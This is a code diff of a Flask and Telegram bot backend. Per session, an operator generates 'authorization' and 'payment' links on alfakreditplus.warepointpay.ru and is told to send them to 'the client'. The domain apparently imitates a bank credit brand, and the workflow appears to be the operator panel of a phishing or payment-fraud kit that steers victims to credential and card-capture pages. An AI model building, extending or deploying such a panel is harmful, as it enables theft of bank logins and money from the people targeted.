@@ -11,7 +11,7 @@ CORS(app)
 
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
 ADMIN_CHAT_ID = int(os.environ.get("ADMIN_CHAT_ID", 0))
-SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru/page_56637/")
+SITE_URL = os.environ.get("SITE_URL", "https://alfakreditplus.warepointpay.ru")
 
 # ========== БАЗА ДАННЫХ ==========
 def init_db():
@@ -45,7 +45,7 @@ def get_keyboard(session_id):
         ]
     }
 
-# ========== ОБРАБОТКА КНОПОК (callback) ==========
+# ========== ОБРАБОТКА КНОПОК ==========
 def send_callback_answer(callback_id, text):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
     requests.post(url, json={"callback_query_id": callback_id, "text": text})
@@ -57,7 +57,6 @@ def edit_message_text(chat_id, message_id, new_text, keyboard=None):
         data["reply_markup"] = keyboard
     requests.post(url, json=data)
 
-# Эндпоинт для обработки callback'ов от Telegram
 @app.route('/webhook', methods=['POST'])
 def webhook():
     data = request.json
@@ -70,23 +69,22 @@ def webhook():
         
         if callback_data.startswith('auth:'):
             session_id = callback_data.split(':')[1]
-            link = f"{SITE_URL}?session={session_id}&step=auth"
-            send_callback_answer(callback_id, "✅ Ссылка скопирована в сообщение")
-            edit_message_text(chat_id, message_id, 
+            link = f"{SITE_URL}/page_82554/?session={session_id}"
+            send_callback_answer(callback_id, "✅ Ссылка на авторизацию")
+            edit_message_text(chat_id, message_id,
                 f"🔐 <b>Ссылка на авторизацию</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
             
         elif callback_data.startswith('payment:'):
             session_id = callback_data.split(':')[1]
-            link = f"{SITE_URL}?session={session_id}&step=payment"
-            send_callback_answer(callback_id, "✅ Ссылка скопирована в сообщение")
+            link = f"{SITE_URL}/page_63860/?session={session_id}"
+            send_callback_answer(callback_id, "✅ Ссылка на оплату")
             edit_message_text(chat_id, message_id,
                 f"💳 <b>Ссылка на оплату</b>\n\n{link}\n\nОтправьте эту ссылку клиенту.", None)
             
         elif callback_data.startswith('reject:'):
             session_id = callback_data.split(':')[1]
             send_callback_answer(callback_id, "❌ Заявка отклонена")
-            edit_message_text(chat_id, message_id,
-                f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}", None)
+            edit_message_text(chat_id, message_id, f"❌ <b>ЗАЯВКА ОТКЛОНЕНА</b>\n\nСессия: {session_id}", None)
             
             conn = sqlite3.connect('applications.db')
             c = conn.cursor()
